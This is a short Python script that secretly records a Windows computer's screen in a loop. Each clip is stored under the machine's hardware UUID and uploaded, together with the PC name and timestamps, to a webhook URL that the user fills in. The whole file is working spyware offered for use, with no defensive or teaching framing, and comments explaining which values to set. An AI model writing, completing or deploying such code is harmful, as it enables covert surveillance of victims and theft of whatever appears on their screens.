import sys
import time
from time import strftime, gmtime
import numpy
import random
import string
import subprocess
import threading
import socket
import requests
from screen_recorder_sdk import screen_recorder

webhook = "webhook_here" #! Webhook URL

pcname = socket.gethostname() #! Gets PC Name

def main():
    currenttime = strftime("%Y-%m-%d %H:%M:%S", gmtime()) #! Gets the current time

    # screen_recorder.enable_dev_log()

    pid = 0
    
    screen_recorder.init_resources(pid) 

    foldername = str(subprocess.check_output('wmic csproduct get uuid')).split(
        '\\r\\n')[1].strip('\\r').strip() #! Grabs HWID / UUID

    rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)) #! Makes random code 

    screen_recorder.start_video_recording(f'C:\\Windows\\Temp\\{foldername}\\{rand}.mp4', 30, 8000000, True)

    time.sleep(7)

    screen_recorder.stop_video_recording()
    screen_recorder.free_resources()

    finishedtime = strftime("%Y-%m-%d %H:%M:%S", gmtime()) #! Gets the current time

    files = {
        'files': open(f'C:\\Windows\\Temp\\{foldername}\\{rand}.mp4', 'rb') #! Don't touch tbh
    }
    values = {
        'upload_file':
        f'C:\\Windows\\Temp\\{foldername}\\{rand}.mp4', #! Don't touch tbh
        'DB':
        'photcat', #! Don't touch tbh
        'OUT':
        'mp4', #! Don't touch tbh
        'SHORT':
        'short', #! Don't touch tbh
        'content':
        f'```asciidoc\nAttached Image for :: {pcname}\nStarted Recording at :: {currenttime}\nStopped Recording at :: {finishedtime}```', #! Don't touch tbh
        'username':
        'Capture', #! Username for webhook
        'avatar_url':
        'https://facebook.github.io/screenshot-tests-for-android/static/logo.png', #! Webhook Avatar URL Here
    } #! Values for the file. 

    requests.post(webhook, files=files, data=values) #! Sends data


while True:
    thread = threading.Thread(target=main())
    thread.start()
